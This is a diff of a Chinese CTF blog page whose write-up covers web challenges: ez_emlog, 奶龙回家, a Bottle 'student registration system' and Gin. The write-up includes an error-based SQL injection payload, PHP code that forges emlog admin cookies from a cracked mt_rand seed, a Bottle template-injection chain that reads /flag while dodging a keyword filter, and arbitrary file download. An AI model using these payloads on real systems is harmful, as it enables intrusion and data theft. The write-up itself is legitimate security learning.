@@ -59,7 +59,7 @@
         <div class="post-tags"><a href="/tags/?tag=CTF">#CTF</a><a href="/tags/?tag=web">#web</a></div>
       </header>
       <div class="post-layout section-shell">
-        <article class="article-content" data-article-content><h1 id="web">WEB<a class="heading-anchor" href="#web" aria-label="链接到 WEB">#</a></h1><h2 id="ez-emlog">ez_emlog<a class="heading-anchor" href="#ez-emlog" aria-label="链接到 ez emlog">#</a></h2><blockquote>
+        <article class="article-content" data-article-content><h2 id="web">WEB<a class="heading-anchor" href="#web" aria-label="链接到 WEB">#</a></h2><h3 id="ez-emlog">ez_emlog<a class="heading-anchor" href="#ez-emlog" aria-label="链接到 ez emlog">#</a></h3><blockquote>
 <p>猴子大王在1月23日开始学习Web安全并搭建了一个博客，你能找到他博客的漏洞吗。</p>
 </blockquote>
 <blockquote>
@@ -67,14 +67,14 @@
 <p>也是给我挖上0day了</p>
 </blockquote>
 <p>拉源码做审计</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208164547850.png" alt="image-20250208164547850" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208164547850.png" alt="image-20250208164547850" loading="lazy" decoding="async"></span></figure></p>
 <p>跟一下，使用mt_rand生成随机数</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208164602668.png" alt="image-20250208164602668" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208164602668.png" alt="image-20250208164602668" loading="lazy" decoding="async"></span></figure></p>
 <p>由于这两个都调用了getRandStr函数，分别查看调用</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208165139326.png" alt="image-20250208165139326" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208165139326.png" alt="image-20250208165139326" loading="lazy" decoding="async"></span></figure></p>
 <p>account.php的logout接口设置了cookie，可以访问看一下</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208165253362.png" alt="image-20250208165253362" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/c83d4f3bfbad7deb7f795e1d8e6ed7b.png" alt="c83d4f3bfbad7deb7f795e1d8e6ed7b" loading="lazy" decoding="async"><figcaption>c83d4f3bfbad7deb7f795e1d8e6ed7b</figcaption></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208165253362.png" alt="image-20250208165253362" loading="lazy" decoding="async"></span></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/c83d4f3bfbad7deb7f795e1d8e6ed7b.png" alt="c83d4f3bfbad7deb7f795e1d8e6ed7b" loading="lazy" decoding="async"></span><figcaption>c83d4f3bfbad7deb7f795e1d8e6ed7b</figcaption></figure></p>
 <p>果然返回了，那么就可以逆序getRandStr进行解密后补零进行seed爆破</p>
 <blockquote>
 <p>mt_rand()函数的特性-MT19937</p>
@@ -97,13 +97,13 @@
 <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$i</span>++) {
     <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$chars</span>, <span class="hljs-variable">$p</span>[<span class="hljs-variable">$i</span>]);
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$number</span> <span class="hljs-subst">$number</span> 0 <span class="hljs-subst">$chars_length</span> &quot;</span>;
-}</code></pre></figure><p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208171304459.png" alt="image-20250208171304459" loading="lazy" decoding="async"></figure></p>
+}</code></pre></figure><p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208171304459.png" alt="image-20250208171304459" loading="lazy" decoding="async"></span></figure></p>
 <p>得到seed</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208165953689.png" alt="image-20250208165953689" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208165953689.png" alt="image-20250208165953689" loading="lazy" decoding="async"></span></figure></p>
 <p>拿到种子第一件事就是伪造cookie</p>
 <p>但是在loginauth.php中发现与用户名有关联</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208170520901.png" alt="image-20250208170520901" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208170612645.png" alt="image-20250208170612645" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208170520901.png" alt="image-20250208170520901" loading="lazy" decoding="async"></span></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208170612645.png" alt="image-20250208170612645" loading="lazy" decoding="async"></span></figure></p>
 <p>于是想到sql注入，将username部分进行报错注入（exp下面有</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">GET /admin/../ HTTP/1.1
 Host: node.vnteam.cn:48595
@@ -114,12 +114,12 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Referer: http://node.vnteam.cn:48595/admin/account.php?action=logout
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
-Connection: close</code></pre></figure><p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/956ca770bed18d7171fb2eb80452858.png" alt="956ca770bed18d7171fb2eb80452858" loading="lazy" decoding="async"><figcaption>956ca770bed18d7171fb2eb80452858</figcaption></figure></p>
+Connection: close</code></pre></figure><p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/956ca770bed18d7171fb2eb80452858.png" alt="956ca770bed18d7171fb2eb80452858" loading="lazy" decoding="async"></span><figcaption>956ca770bed18d7171fb2eb80452858</figcaption></figure></p>
 <p>中间靶机到期了</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155050122.png" alt="image-20250208155050122" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155205361.png" alt="image-20250208155205361" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155230657.png" alt="image-20250208155230657" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155346815.png" alt="image-20250208155346815" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155050122.png" alt="image-20250208155050122" loading="lazy" decoding="async"></span></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155205361.png" alt="image-20250208155205361" loading="lazy" decoding="async"></span></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155230657.png" alt="image-20250208155230657" loading="lazy" decoding="async"></span></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155346815.png" alt="image-20250208155346815" loading="lazy" decoding="async"></span></figure></p>
 <p>到这里停了，看到user表，可以停住进去查看一下</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">1&#039; and extractvalue(1,concat(0x7e,(select GROUP_CONCAT(column_name) from information_schema.columns where table_schema=database() and table_name=&#039;emlog_user&#039;),0x7e))#</code></pre></figure><p>然后就可以查看username</p>
 <p>最终exp</p>
@@ -144,7 +144,7 @@ Connection: close</code></pre></figure><p><figure class="article-image"><img src
 <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>, <span class="hljs-variable">$key</span>);
 
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&quot;</span> . <span class="hljs-variable">$username</span> . <span class="hljs-string">&quot;|&quot;</span> . <span class="hljs-variable">$expiration</span> . <span class="hljs-string">&quot;|&quot;</span> . <span class="hljs-variable">$hash</span>;
-</code></pre></figure><p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208160349190.png" alt="image-20250208160349190" loading="lazy" decoding="async"></figure></p>
+</code></pre></figure><p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208160349190.png" alt="image-20250208160349190" loading="lazy" decoding="async"></span></figure></p>
 <p>得到username（一共33位，substr截断即可</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">1QXgVCpRbGseY_UA6DPDV1K8XOCZHUxm</code></pre></figure><p>伪造admin身份进后台</p>
 <figure class="code-block"><figcaption><span>php</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-php"><span class="hljs-meta">&lt;?php</span>
@@ -167,17 +167,17 @@ Connection: close</code></pre></figure><p><figure class="article-image"><img src
 <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$authkey</span>);
 <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>, <span class="hljs-variable">$key</span>);
 
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&quot;</span> . <span class="hljs-variable">$username</span> . <span class="hljs-string">&quot;|&quot;</span> . <span class="hljs-variable">$expiration</span> . <span class="hljs-string">&quot;|&quot;</span> . <span class="hljs-variable">$hash</span>;</code></pre></figure><p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208161237958.png" alt="image-20250208161237958" loading="lazy" decoding="async"></figure></p>
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&quot;</span> . <span class="hljs-variable">$username</span> . <span class="hljs-string">&quot;|&quot;</span> . <span class="hljs-variable">$expiration</span> . <span class="hljs-string">&quot;|&quot;</span> . <span class="hljs-variable">$hash</span>;</code></pre></figure><p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208161237958.png" alt="image-20250208161237958" loading="lazy" decoding="async"></span></figure></p>
 <p>然后就简单了，对着开发文档上传木马即可</p>
 <p><a href="https://blog.csdn.net/aiquan9342/article/details/102075533" target="_blank" rel="noopener noreferrer">emblog后台拿shell-CSDN博客<svg class="icon external-link-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208161753904.png" alt="image-20250208161753904" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162459529.png" alt="image-20250208162459529" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208161753904.png" alt="image-20250208161753904" loading="lazy" decoding="async"></span></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162459529.png" alt="image-20250208162459529" loading="lazy" decoding="async"></span></figure></p>
 <p>创建对应目录结构然后打包上传</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162526373.png" alt="image-20250208162526373" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162608905.png" alt="image-20250208162608905" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162738604.png" alt="image-20250208162738604" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162748410.png" alt="image-20250208162748410" loading="lazy" decoding="async"></figure></p>
-<h2 id="奶龙回家">奶龙回家<a class="heading-anchor" href="#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6" aria-label="链接到 奶龙回家">#</a></h2><blockquote>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162526373.png" alt="image-20250208162526373" loading="lazy" decoding="async"></span></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162608905.png" alt="image-20250208162608905" loading="lazy" decoding="async"></span></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162738604.png" alt="image-20250208162738604" loading="lazy" decoding="async"></span></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162748410.png" alt="image-20250208162748410" loading="lazy" decoding="async"></span></figure></p>
+<h3 id="奶龙回家">奶龙回家<a class="heading-anchor" href="#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6" aria-label="链接到 奶龙回家">#</a></h3><blockquote>
 <p>小朋友们你们好呀，我是奶龙，请帮我找到username和password，获得胖猫留下的flag吧 //容易炸链接，可以多试几次</p>
 </blockquote>
 <blockquote>
@@ -230,23 +230,23 @@ flag = <span class="hljs-string">&#x27;&#x27;</span>
 
 <span class="hljs-built_in">print</span>(flag)
 <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span> + <span class="hljs-built_in">bytes</span>.fromhex(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
-</code></pre></figure><h2 id="学生姓名登记系统">学生姓名登记系统<a class="heading-anchor" href="#%E5%AD%A6%E7%94%9F%E5%A7%93%E5%90%8D%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F" aria-label="链接到 学生姓名登记系统">#</a></h2><blockquote>
+</code></pre></figure><h3 id="学生姓名登记系统">学生姓名登记系统<a class="heading-anchor" href="#%E5%AD%A6%E7%94%9F%E5%A7%93%E5%90%8D%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F" aria-label="链接到 学生姓名登记系统">#</a></h3><blockquote>
 <p>Infernity师傅用某个单文件框架给他的老师写了一个“学生姓名登记系统”，并且对用户的输入做了严格的限制，他自认为他的系统无懈可击，但是真的无懈可击吗？</p>
 </blockquote>
 <p>python的单文件框架有Flask Bottle Falcon Sanic Tornado FastAPI等等</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250210183518890.png" alt="image-20250210183518890" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250210183518890.png" alt="image-20250210183518890" loading="lazy" decoding="async"></span></figure></p>
 <p>经分析是一个bottle框</p>
 <blockquote>
 <p>bottle框架可以任意执行单行python代码</p>
 </blockquote>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250210184147681.png" alt="image-20250210184147681" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250210184147681.png" alt="image-20250210184147681" loading="lazy" decoding="async"></span></figure></p>
 <p>另外 字符串有长度限制 已知bottle上下文具有关联功能</p>
 <p>直接</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">&quot;&quot;&quot;
 %a=__builtins__
 &quot;&quot;&quot;
 {{a}}</code></pre></figure><p>查看函数发现open</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211144516358.png" alt="image-20250211144516358" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211144516358.png" alt="image-20250211144516358" loading="lazy" decoding="async"></span></figure></p>
 <p>直接open会hacker，单引号绕过</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">&quot;&quot;&quot;
 %a=__builtins__
@@ -265,30 +265,30 @@ lasses__}}%0a{{e:=d()[156]}}%0a{{f:=e.__init__}}%0a{{g:=f.__global
 s__}}%0a{{z:=&#039;__builtins__&#039;}}%0a{{h:=g[z]}}%0a{{i:=h[&#039;op&#039;&#039;en&#039;]}}%0
 a{{x:=i(&quot;/flag&quot;)}}%0a{{y:=x.read()}}</code></pre></figure><p>思路大同小异</p>
 <p>比如输入<code>{{print(5)}}</code>，实际上5已经输入到控制台了 拼接<code>{{a:=5}}%0a{{print(a)}}</code>发现能读上下文，同理得到flag</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211143330052.png" alt="image-20250211143330052" loading="lazy" decoding="async"></figure></p>
-<h2 id="gin">Gin<a class="heading-anchor" href="#gin" aria-label="链接到 Gin">#</a></h2><blockquote>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211143330052.png" alt="image-20250211143330052" loading="lazy" decoding="async"></span></figure></p>
+<h3 id="gin">Gin<a class="heading-anchor" href="#gin" aria-label="链接到 Gin">#</a></h3><blockquote>
 <p>go是世界上最好的语言</p>
 </blockquote>
 <p>查看routes.go可以大致看出</p>
 <p>普通用户注册后有个上传功能，admin有个eval路由，应该可以执行代码</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211150840054.png" alt="image-20250211150840054" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211150840054.png" alt="image-20250211150840054" loading="lazy" decoding="async"></span></figure></p>
 <p>并且发现有一个jwt，可以注册个用户看看先</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211150940710.png" alt="image-20250211150940710" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211150940710.png" alt="image-20250211150940710" loading="lazy" decoding="async"></span></figure></p>
 <p>注册一个用户后登录</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211151437619.png" alt="image-20250211151437619" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211151437619.png" alt="image-20250211151437619" loading="lazy" decoding="async"></span></figure></p>
 <p>jwt解密</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211151446374.png" alt="image-20250211151446374" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211151446374.png" alt="image-20250211151446374" loading="lazy" decoding="async"></span></figure></p>
 <p>然后可以看一下jwt相关逻辑</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211151754391.png" alt="image-20250211151754391" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211151754391.png" alt="image-20250211151754391" loading="lazy" decoding="async"></span></figure></p>
 <p>将年份作为种子，生成0-999拼接上config.Key()</p>
 <p>不过题目源码没给key</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152118466.png" alt="image-20250211152118466" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152118466.png" alt="image-20250211152118466" loading="lazy" decoding="async"></span></figure></p>
 <p>上传任意文件，发现提供了预览和下载两种模式</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152233512.png" alt="image-20250211152233512" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152233512.png" alt="image-20250211152233512" loading="lazy" decoding="async"></span></figure></p>
 <p>download发现任意文件下载</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152417415.png" alt="image-20250211152417415" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="fallback"><span class="article-image-frame article-image-frame--fallback" style="--image-ratio:16 / 9;--image-max-width:100%"><img data-article-image src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152417415.png" alt="image-20250211152417415" loading="lazy" decoding="async"></span></figure></p>
 <p>直接读../config/key.go</p>
-<p><figure class="article-image"><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152550059.png" alt="image-20250211152550059" loading="lazy" decoding="async"></figure></p>
